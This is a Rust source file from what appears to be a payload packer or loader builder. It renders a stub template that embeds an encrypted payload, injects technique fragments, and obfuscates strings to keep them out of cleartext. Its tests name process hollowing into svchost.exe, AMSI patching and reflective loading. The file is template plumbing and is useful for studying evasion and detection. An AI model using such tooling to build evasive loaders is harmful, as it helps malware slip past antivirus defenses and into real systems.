//! Stub rendering from the template.
//!
//! The template (`templates/stub/main.rs.tpl`) is the generic skeleton: it
//! contains `{{NAME}}`-style placeholders plus a `{{STUB_FRAGMENT}}` slot where
//! the active techniques' fragments are injected. Each technique contributes
//! its fragment through `PipelineStep::render_fragment` (see `techniques`).
//! Any placeholder left unsubstituted (or missing from the template) is an
//! error, to catch stale templates.

use rand::RngCore;

use super::obfuscation::StringsConfig;
use super::{BuildError, Result};
use crate::techniques::PipelineStep;

/// Values used to fill the template placeholders.
pub struct StubParams {
    /// Nonce (24 bytes) in hex.
    pub nonce_hex: String,
    /// Key (32 bytes) in hex.
    pub key_hex: String,
    /// Original payload size.
    pub plaintext_len: usize,
    /// Per-build unique marker (e.g. `STUB_MARKER_<hex>`).
    pub stub_marker: String,
    /// Path to `payload.bin` for `include_bytes!` (relative to the stub).
    pub payload_path: String,
}

/// Generates a per-build unique marker: `STUB_MARKER_<16 hex>`.
pub fn generate_stub_marker() -> String {
    let mut bytes = [0u8; 8];
    rand::thread_rng().fill_bytes(&mut bytes);
    format!("STUB_MARKER_{}", hex::encode(bytes))
}

/// Renders `template`, substituting every placeholder with `params` and
/// injecting the active techniques' fragments (`pipeline`) into
/// `{{PREPARATION_BLOCKS}}` (Preparation techniques, in order) and
/// `{{EXECUTION_BLOCK}}` (the single Execution technique). Every sensitive
/// string literal (the marker, and any technique parameter) is obfuscated
/// through `strings` and emitted as code that rebuilds it at runtime.
///
/// Returns an error if an expected placeholder is missing from the template or
/// if any `{{...}}` is left unsubstituted.
pub fn render_main_rs(
    template: &str,
    params: &StubParams,
    pipeline: &[PipelineStep],
    strings: &StringsConfig,
) -> Result<String> {
    use crate::techniques::Category;

    // Split the pipeline into Preparation fragments and the Execution fragment.
    let mut preparation_blocks = String::new();
    let mut preparation_calls = String::new();
    let mut execution_block = String::new();

    for step in pipeline {
        let fragment = step.render_fragment(strings);
        match step.category() {
            Category::Preparation => {
                // Wrap each Preparation fragment in its own module so their
                // `use` statements do not collide with each other or with the
                // Execution fragment (all are injected into the same file).
                let module = format!("technique_{}", step.name());
                preparation_blocks.push_str(&format!("mod {module} {{\n"));
                preparation_blocks.push_str(&fragment);
                preparation_blocks.push_str("\n}\n\n");
                preparation_calls.push_str(&format!(
                    "    {module}::{}().map_err(|e| e.to_string())?;\n",
                    step.name()
                ));
            }
            Category::Execution => {
                execution_block.push_str(&fragment);
                execution_block.push('\n');
            }
        }
    }

    // The dispatcher is always emitted (an empty body when there are no
    // Preparation techniques) so the template can call it unconditionally.
    preparation_blocks.push_str("fn run_preparations() -> Result<(), String> {\n");
    preparation_blocks.push_str(&preparation_calls);
    preparation_blocks.push_str("    Ok(())\n}\n");

    let stub_marker_def = strings
        .obfuscate(&params.stub_marker)
        .render_stub_expr("stub_marker");

    let replacements: Vec<(&str, String)> = vec![
        ("{{NONCE_HEX}}", params.nonce_hex.clone()),
        ("{{KEY_HEX}}", params.key_hex.clone()),
        ("{{PLAINTEXT_LEN}}", params.plaintext_len.to_string()),
        ("{{STUB_MARKER_DEF}}", stub_marker_def),
        ("{{PAYLOAD_PATH}}", params.payload_path.clone()),
        ("{{PREPARATION_BLOCKS}}", preparation_blocks),
        ("{{EXECUTION_BLOCK}}", execution_block),
    ];

    let mut rendered = template.to_string();

    for (placeholder, value) in &replacements {
        if !rendered.contains(placeholder) {
            return Err(BuildError::InvalidTemplate(format!(
                "placeholder '{placeholder}' does not appear in the template"
            )));
        }
        rendered = rendered.replace(placeholder, value);
    }

    // Detect unknown placeholders that were left unsubstituted.
    if let Some(start) = rendered.find("{{") {
        let end = rendered[start..]
            .find("}}")
            .map(|e| start + e + 2)
            .unwrap_or(rendered.len());
        let residual = &rendered[start..end];
        return Err(BuildError::InvalidTemplate(format!(
            "the template contains an unsubstituted placeholder: '{residual}'"
        )));
    }

    Ok(rendered)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::engine::obfuscation::{StringStrategy, StringsConfig};
    use crate::techniques::process_hollowing::Params;

    /// Minimal template with every generic placeholder.
    ///
    /// Deliberately does *not* define `dec_xor` (the real template does), so
    /// that the strategy tests below can assert on the substituted fragment
    /// alone: xor emits a `dec_xor` call, stack emits none.
    const TEMPLATE: &str = r#"
const NONCE_HEX: &str = "{{NONCE_HEX}}";
const KEY_HEX: &str = "{{KEY_HEX}}";
const PLAINTEXT_LEN: usize = {{PLAINTEXT_LEN}};
static PAYLOAD_ENC: &[u8] = include_bytes!("{{PAYLOAD_PATH}}");
fn run() {
    let stub_marker = {{STUB_MARKER_DEF}};
}
{{PREPARATION_BLOCKS}}
{{EXECUTION_BLOCK}}
"#;

    fn params() -> StubParams {
        StubParams {
            nonce_hex: "00".repeat(24),
            key_hex: "11".repeat(32),
            plaintext_len: 1234,
            stub_marker: "STUB_MARKER_deadbeef".to_string(),
            payload_path: "payload.bin".to_string(),
        }
    }

    fn pipeline() -> Vec<PipelineStep> {
        vec![PipelineStep::ProcessHollowing(Params {
            target: r"C:\Windows\System32\svchost.exe".to_string(),
        })]
    }

    fn xor_config() -> StringsConfig {
        StringsConfig {
            strategy: StringStrategy::Xor,
            key: Some([0x5Au8; 32]),
        }
    }

    fn stack_config() -> StringsConfig {
        StringsConfig {
            strategy: StringStrategy::Stack,
            key: None,
        }
    }

    #[test]
    fn substitutes_all_placeholders() {
        let out = render_main_rs(TEMPLATE, &params(), &[], &xor_config())
            .expect("should render without error");

        assert!(!out.contains("{{"), "no placeholders should remain: {out}");
        assert!(out.contains(&"00".repeat(24)), "nonce not substituted");
        assert!(out.contains(&"11".repeat(32)), "key not substituted");
        assert!(out.contains("1234"), "plaintext_len not substituted");
        assert!(out.contains("payload.bin"), "payload_path not substituted");
        // Sensitive strings must not appear in cleartext.
        assert!(!out.contains("STUB_MARKER_deadbeef"));
    }

    #[test]
    fn marker_and_target_defs_are_emitted() {
        let out = render_main_rs(TEMPLATE, &params(), &pipeline(), &xor_config())
            .expect("should render with a technique");

        // Both definitions must be emitted and the placeholders gone.
        assert!(
            out.contains("let stub_marker = crate::dec_xor"),
            "marker def not emitted: {out}"
        );
        assert!(
            out.contains("let hollow_target = crate::dec_xor"),
            "target def not emitted: {out}"
        );
        assert!(
            !out.contains("HOLLOW_TARGET_DEF"),
            "target placeholder not substituted"
        );
        assert!(out.contains("fn run_stage_two"), "fragment not injected");
    }

    #[test]
    fn preparation_and_execution_blocks_are_both_emitted() {
        let pipeline = vec![
            PipelineStep::PatchAmsi(crate::techniques::patch_amsi::Params {}),
            PipelineStep::ReflectiveLoading(crate::techniques::reflective_loading::Params {}),
        ];
        let out = render_main_rs(TEMPLATE, &params(), &pipeline, &xor_config())
            .expect("should render with preparation + execution");

        assert!(
            out.contains("fn patch_amsi"),
            "preparation fragment missing: {out}"
        );
        assert!(
            out.contains("mod technique_patch_amsi"),
            "preparation fragment not namespaced: {out}"
        );
        assert!(
            out.contains("fn run_preparations"),
            "preparation dispatcher missing: {out}"
        );
        assert!(
            out.contains("technique_patch_amsi::patch_amsi().map_err(|e| e.to_string())?"),
            "preparation call missing: {out}"
        );
        assert!(
            out.contains("fn run_reflective"),
            "execution fragment missing: {out}"
        );
        assert!(
            out.contains("fn execute_payload"),
            "execution adapter missing: {out}"
        );
    }

    #[test]
    fn xor_fragment_contains_dec_xor() {
        let out =
            render_main_rs(TEMPLATE, &params(), &pipeline(), &xor_config()).expect("should render");
        assert!(out.contains("dec_xor"), "xor fragment must call dec_xor");
    }

    #[test]
    fn stack_fragment_avoids_dec_xor_and_cleartext() {
        let out = render_main_rs(TEMPLATE, &params(), &pipeline(), &stack_config())
            .expect("should render");

        // No decoder, and neither sensitive string may appear in cleartext.
        assert!(
            !out.contains("dec_xor"),
            "stack must not emit dec_xor: {out}"
        );
        assert!(
            !out.contains("STUB_MARKER_deadbeef"),
            "marker leaked: {out}"
        );
        assert!(
            !out.contains(r"C:\Windows\System32\svchost.exe"),
            "target leaked: {out}"
        );
    }

    #[test]
    fn missing_placeholder_is_an_error() {
        let tpl = TEMPLATE.replace("{{KEY_HEX}}", "already-substituted");
        let err = render_main_rs(&tpl, &params(), &[], &xor_config()).expect_err("should fail");
        let msg = err.to_string();
        assert!(msg.contains("KEY_HEX"), "unclear error message: {msg}");
    }

    #[test]
    fn unknown_placeholder_is_an_error() {
        // Use concatenation (not `format!`) so that `{{` stays literal.
        let tpl = TEMPLATE.to_string() + "\nconst EXTRA: &str = \"{{UNKNOWN}}\";\n";
        let err = render_main_rs(&tpl, &params(), &[], &xor_config()).expect_err("should fail");
        let msg = err.to_string();
        assert!(msg.contains("UNKNOWN"), "unclear error message: {msg}");
    }
}
